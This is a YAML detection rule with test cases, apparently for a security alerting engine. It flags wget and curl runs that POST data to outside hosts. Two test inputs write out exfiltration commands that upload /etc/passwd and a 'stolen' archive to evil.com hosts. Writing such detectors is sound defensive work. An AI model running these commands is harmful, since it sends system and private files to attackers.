name: rta_wget_post_exfil
mode: alert
overlap_allowed_with: [sigma_curl_usage, sigma_local_account, sigma_susp_curl_fileupload]
eval: |
  (
    e.process_name == "wget" &&
    e.process_args.contains("--post-data")
  ) ||
  (
    e.process_name == "curl" &&
    (
      re_match(e.process_args, "(-X\\s+POST|--data|--data-binary|-d\\s)") &&
      !e.process_args.contains("localhost") &&
      !e.process_args.contains("127.0.0.1")
    )
  )
tests:
  - cleartext: "wget POST exfiltration"
    process_name: wget
    process_args: "wget --post-data=msg=AtomicTestT1048.002 --timeout=5 --no-check-certificate https://example.com/ --delete-after"
    should_match: true
  - cleartext: "curl POST exfiltration"
    process_name: curl
    process_args: "curl -X POST -d @/etc/passwd https://evil.com/collect"
    should_match: true
  - cleartext: "curl data-binary upload"
    process_name: curl
    process_args: "curl --data-binary @/tmp/stolen.tar.gz https://c2.evil.com/upload"
    should_match: true
  - cleartext: "normal wget download"
    process_name: wget
    process_args: "wget https://example.com/file.tar.gz"
    should_match: false
  - cleartext: "curl POST to localhost (not exfil)"
    process_name: curl
    process_args: "curl -X POST -d test localhost:8080/api"
    should_match: false
